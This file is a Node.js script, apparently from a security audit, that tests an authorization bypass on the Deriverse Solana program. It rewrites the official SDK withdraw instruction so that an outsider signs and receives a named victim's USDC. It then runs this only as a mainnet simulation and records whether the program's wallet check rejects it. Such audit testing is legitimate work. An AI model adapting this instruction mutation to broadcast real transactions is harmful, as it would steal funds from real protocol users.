#!/usr/bin/env node
'use strict';

// Current mainnet-beta signed simulation only. There is intentionally no
// sendTransaction/sendRawTransaction path in this file.
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const MODULES = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const SDK_ROOT = process.env.DERIVERSE_SDK_ROOT || '/tmp/deriverse-gate.6LjKor/kit';
const RPC_URL = process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com';
const KEYPAIR_PATH = process.env.HOOKED_KEYPAIR_PATH || '/Users/stacc/hooked.json';
const {
  Keypair,
  PublicKey,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} = require(MODULES + '/@solana/web3.js');
const {getAssociatedTokenAddressSync} = require(MODULES + '/@solana/spl-token');
const {Engine} = require(SDK_ROOT + '/dist');
const {createSolanaRpc} = require(SDK_ROOT + '/node_modules/@solana/kit');

const PROGRAM = 'DRVSpZ2YUYYKgZP8XtLhAGtT1zYSCKzeHfb4DgRnrgqD';
const PROGRAM_DATA = '6DCXx7tbchQXv7WUgQ1u9STwPciWnwgyWU6DQitnLhh';
const PROGRAM_DATA_ELF_SHA256 = '13a87c3105475aeeb1fb7ddf3e89499d4dfbc79f3f5585703e4feceb55d84820';
const MAINNET_GENESIS = '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d';
const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
const USDC_VAULT = 'EPUHjseXG3izk3MVUJ1PcyWT9xeBhtAnq8gUpq3j8Uni';
const VICTIM_WALLET = 'J7pTDgEw7yrrRX22T3XLMGfNmnXJMfJuSVyCRo86YnFm';
const VICTIM_PRIMARY = '43vSCPWAaLQdXTf7PDnnf1jPbyPCXwgjLHQe895B3dq2';
const AMOUNT_UI = 1;
const AMOUNT_RAW = '1000000';
let rpcId = 0;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const sha256 = data => crypto.createHash('sha256').update(data).digest('hex');

async function rpc(method, params = [], attempts = 10) {
  let last;
  for (let attempt = 0; attempt < attempts; attempt++) {
    const response = await fetch(RPC_URL, {
      method: 'POST',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params}),
    });
    const text = await response.text();
    if (response.status === 429) {
      last = new Error(`${method}: rate limited`);
      await sleep(Math.min(8000, 600 * (attempt + 1)));
      continue;
    }
    let body;
    try { body = JSON.parse(text); } catch {
      throw new Error(`${method}: non-JSON response (${response.status})`);
    }
    if (body.error) throw new Error(`${method}: ${body.error.message || JSON.stringify(body.error)}`);
    return body.result;
  }
  throw last || new Error(`${method}: exhausted retries`);
}

function loadSigner() {
  const secret = JSON.parse(fs.readFileSync(KEYPAIR_PATH, 'utf8'));
  if (!Array.isArray(secret) || secret.length !== 64 ||
      !secret.every(x => Number.isInteger(x) && x >= 0 && x <= 255)) {
    throw new Error('runtime signer has invalid shape');
  }
  return Keypair.fromSecretKey(Uint8Array.from(secret));
}

function deriveClient(wallet, tag) {
  const discriminator = Buffer.alloc(8);
  discriminator.writeUInt32LE(1, 0);
  discriminator.writeUInt32LE(tag, 4);
  return PublicKey.findProgramAddressSync(
    [discriminator, new PublicKey(wallet).toBuffer()], new PublicKey(PROGRAM))[0];
}

function tokenAmount(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}

function clientSnapshot(account, tokenId) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  if (data.length < 376) return {dataBytes: data.length, invalid: true};
  const assetsCount = data.readUInt32LE(300);
  const assets = [];
  for (let index = 0; index < assetsCount && 376 + 16 * (index + 1) <= data.length; index++) {
    const offset = 376 + index * 16;
    assets.push({
      assetId: data.readUInt32LE(offset),
      tempId: data.readUInt32LE(offset + 4),
      value: data.readBigInt64LE(offset + 8).toString(),
    });
  }
  const tokenAsset = assets.find(asset => (asset.assetId & 0x0fffffff) === tokenId) || null;
  return {
    wallet: new PublicKey(data.subarray(8, 40)).toBase58(),
    id: data.readUInt32LE(248),
    vmMask: data.readUInt32LE(172),
    assetsCount,
    tokenId,
    tokenAsset,
    dataSha256: sha256(data),
  };
}

function deploymentMetadata(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  if (data.length < 45) return {invalid: true, dataBytes: data.length};
  return {
    loaderState: data.readUInt32LE(0),
    deploySlot: data.readBigUInt64LE(4).toString(),
    upgradeAuthorityOption: data[12],
    upgradeAuthority: data[12] ? new PublicKey(data.subarray(13, 45)).toBase58() : null,
  };
}

function kitInstructionToWeb3(instruction) {
  return new TransactionInstruction({
    programId: new PublicKey(instruction.programAddress),
    keys: instruction.accounts.map(account => ({
      pubkey: new PublicKey(account.address),
      isSigner: account.role >= 2,
      isWritable: (account.role & 1) === 1,
    })),
    data: Buffer.from(instruction.data),
  });
}

function summarizeInstruction(ix) {
  return {
    programId: ix.programId.toBase58(),
    dataHex: ix.data.toString('hex'),
    accounts: ix.keys.map((key, index) => ({
      index,
      address: key.pubkey.toBase58(),
      signer: key.isSigner,
      writable: key.isWritable,
    })),
  };
}

async function main() {
  const signer = loadSigner();
  const signerAddress = signer.publicKey.toBase58();
  const outsiderPrimary = deriveClient(signerAddress, 31);
  const outsiderAta = getAssociatedTokenAddressSync(new PublicKey(USDC_MINT), signer.publicKey);
  const watchedAddresses = [USDC_VAULT, outsiderAta.toBase58(), VICTIM_PRIMARY, outsiderPrimary.toBase58()];

  const kitRpc = createSolanaRpc(RPC_URL);
  const engine = new Engine(kitRpc, {
    programId: PROGRAM,
    version: 1,
    commitment: 'confirmed',
    uiNumbers: true,
  });
  if (!await engine.initialize()) throw new Error('official Deriverse SDK failed to initialize');
  await engine.setSigner(VICTIM_WALLET);
  if (engine.clientPrimaryAccount !== VICTIM_PRIMARY) {
    throw new Error(`SDK live fixture drift: ${engine.clientPrimaryAccount}`);
  }
  const official = kitInstructionToWeb3(await engine.withdrawInstruction({tokenId: 1, amount: AMOUNT_UI}));
  if (official.keys.length !== 10 || official.data[0] !== 8 ||
      official.keys[6].pubkey.toBase58() !== VICTIM_PRIMARY ||
      official.keys[2].pubkey.toBase58() !== USDC_VAULT) {
    throw new Error('official SDK withdraw shape changed');
  }

  // Minimal mutation of the observed live-client shape: replace only the
  // authority/signer and its destination ATA. The funded victim client and all
  // Deriverse state accounts remain byte-for-byte identical to the SDK build.
  const mutated = new TransactionInstruction({
    programId: official.programId,
    data: official.data,
    keys: official.keys.map((key, index) => {
      if (index === 0) return {...key, pubkey: signer.publicKey};
      if (index === 1) return {...key, pubkey: outsiderAta};
      return {...key};
    }),
  });

  const [genesis, pre, programData, latest] = await Promise.all([
    rpc('getGenesisHash'),
    rpc('getMultipleAccounts', [watchedAddresses, {encoding: 'base64', commitment: 'confirmed'}]),
    rpc('getAccountInfo', [PROGRAM_DATA, {encoding: 'base64', dataSlice: {offset: 0, length: 45}, commitment: 'confirmed'}]),
    rpc('getLatestBlockhash', [{commitment: 'confirmed'}]),
  ]);
  if (genesis !== MAINNET_GENESIS) throw new Error(`not mainnet-beta: ${genesis}`);
  if (!pre.value[0] || !pre.value[1] || !pre.value[2]) throw new Error('required live fixture account missing');
  if (pre.value[3] !== null) throw new Error('outsider unexpectedly has a Deriverse client account');
  if (clientSnapshot(pre.value[2], 1)?.wallet !== VICTIM_WALLET) throw new Error('victim client wallet drift');

  const message = new TransactionMessage({
    payerKey: signer.publicKey,
    recentBlockhash: latest.value.blockhash,
    instructions: [mutated],
  }).compileToV0Message();
  const transaction = new VersionedTransaction(message);
  transaction.sign([signer]);
  const wire = Buffer.from(transaction.serialize());
  if (message.header.numRequiredSignatures !== 1) throw new Error('unexpected signature count');
  if (message.staticAccountKeys.length > 64 || wire.length > 4096) throw new Error('transaction envelope exceeds requested bounds');

  const fee = await rpc('getFeeForMessage', [
    Buffer.from(message.serialize()).toString('base64'), {commitment: 'confirmed'},
  ]);
  const simulated = await rpc('simulateTransaction', [wire.toString('base64'), {
    encoding: 'base64',
    sigVerify: true,
    replaceRecentBlockhash: false,
    commitment: 'confirmed',
    innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watchedAddresses},
  }]);
  const post = simulated.value.accounts || [];
  const preVictim = clientSnapshot(pre.value[2], 1);
  const postVictim = clientSnapshot(post[2], 1);
  const preVault = tokenAmount(pre.value[0]);
  const postVault = tokenAmount(post[0]);
  const preDestination = tokenAmount(pre.value[1]);
  const postDestination = tokenAmount(post[1]);
  const rawDelta = (before, after) => before === null || after === null ? null : (BigInt(after) - BigInt(before)).toString();
  const clientValue = snapshot => snapshot?.tokenAsset?.value ?? null;
  const logs = simulated.value.logs || [];
  const tokenProgramInvoked = logs.some(line =>
    line === 'Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]' ||
    line === 'Program TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb invoke [2]');
  const invalidWalletLog = logs.find(line => line.includes('"code":110') && line.includes('Invalid wallet address')) || null;

  const output = {
    generatedAtUtc: new Date().toISOString(),
    network: 'mainnet-beta',
    genesis,
    scope: 'fresh outsider-signed Deriverse withdraw mutation; current mainnet-beta simulation only',
    broadcast: false,
    composerFirst: {
      publishedIdl: false,
      learnedSelector: '0x1a live 15-account swap route',
      note: 'Composer established the current target and live state; the official SDK supplied the withdraw shape tested here.',
    },
    deployment: {
      program: PROGRAM,
      programData: PROGRAM_DATA,
      ...deploymentMetadata(programData.value),
      currentElfSha256FromAcquiredProgramData: PROGRAM_DATA_ELF_SHA256,
    },
    officialSdk: {
      package: '@deriverse/kit',
      version: require(SDK_ROOT + '/package.json').version,
      gitCommit: '5f17de893332d76fd04a01bc4a3fa9a4ed3581b5',
      method: 'Engine.withdrawInstruction({tokenId: 1, amount: 1})',
      fixtureWallet: VICTIM_WALLET,
      fixtureClientPrimary: VICTIM_PRIMARY,
    },
    mutation: {
      changedAccountIndexes: [0, 1],
      description: 'authority/signer and destination ATA changed to fresh outsider; funded victim client and protocol state retained',
      outsider: signerAddress,
      outsiderUsdcAta: outsiderAta.toBase58(),
      outsiderClientPrimary: outsiderPrimary.toBase58(),
      outsiderClientExistsBefore: false,
      requestedUsdcRaw: AMOUNT_RAW,
      officialInstruction: summarizeInstruction(official),
      mutatedInstruction: summarizeInstruction(mutated),
    },
    envelope: {
      version: 0,
      wireBytes: wire.length,
      accountKeyCount: message.staticAccountKeys.length,
      requiredSignatures: message.header.numRequiredSignatures,
      sigVerify: true,
      estimatedFeeLamports: fee.value,
      wireSha256: sha256(wire),
    },
    simulation: {
      contextSlot: simulated.context.slot,
      err: simulated.value.err,
      unitsConsumed: simulated.value.unitsConsumed,
      logs,
      returnData: simulated.value.returnData || null,
    },
    reconciliation: {
      watchedAddresses,
      postAccountsReturned: post.length === watchedAddresses.length && post.every(Boolean),
      postAccountNote: post.length === watchedAddresses.length && post.every(Boolean)
        ? null
        : 'Solana returned null watched-account bodies for the failed simulation; no zero delta is inferred from null.',
      tokenProgramInvoked,
      programVaultTransferObserved: tokenProgramInvoked,
      invalidWalletLog,
      vault: {address: USDC_VAULT, beforeRaw: preVault, simulatedAfterRaw: postVault, deltaRaw: rawDelta(preVault, postVault)},
      outsiderDestination: {address: outsiderAta.toBase58(), beforeRaw: preDestination, simulatedAfterRaw: postDestination, deltaRaw: rawDelta(preDestination, postDestination)},
      victimClient: {
        address: VICTIM_PRIMARY,
        wallet: VICTIM_WALLET,
        beforeUsdcRaw: clientValue(preVictim),
        simulatedAfterUsdcRaw: clientValue(postVictim),
        deltaRaw: rawDelta(clientValue(preVictim), clientValue(postVictim)),
        beforeDataSha256: preVictim?.dataSha256 || null,
        simulatedAfterDataSha256: postVictim?.dataSha256 || null,
      },
      outsiderClient: {
        address: outsiderPrimary.toBase58(),
        before: null,
        simulatedAfter: clientSnapshot(post[3], 1),
        recordedUsdcRawBefore: '0',
      },
    },
  };
  output.conclusion = simulated.value.err && invalidWalletLog && !tokenProgramInvoked
    ? 'gate-held-invalid-wallet-before-token-cpi'
    : simulated.value.err ? 'rejected-other' : 'simulation-succeeded';

  const outputPath = path.join(__dirname, 'deriverse-outsider-withdraw-gate.json');
  fs.writeFileSync(outputPath, JSON.stringify(output, null, 2) + '\n');
  console.log(JSON.stringify({
    outputPath,
    slot: output.simulation.contextSlot,
    outsider: signerAddress,
    outsiderClientExistsBefore: false,
    victimUsdcRaw: output.reconciliation.victimClient.beforeUsdcRaw,
    err: output.simulation.err,
    unitsConsumed: output.simulation.unitsConsumed,
    reconciliation: output.reconciliation,
    conclusion: output.conclusion,
    logs: output.simulation.logs,
  }, null, 2));
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
